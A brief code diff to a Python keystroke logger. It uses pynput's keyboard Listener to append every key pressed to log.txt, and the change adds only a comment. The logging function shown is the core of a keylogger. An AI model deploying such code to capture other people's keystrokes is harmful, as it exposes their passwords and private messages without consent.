@@ -4,6 +4,7 @@ from pynput.keyboard import Listener
 def write_to_file(key):
     f = open("log.txt", 'a')
     letter = str(key).replace("'", "")
+    # handle Keys
     if(letter == 'Key.space'):
         letter = ' '
     f.write(letter)
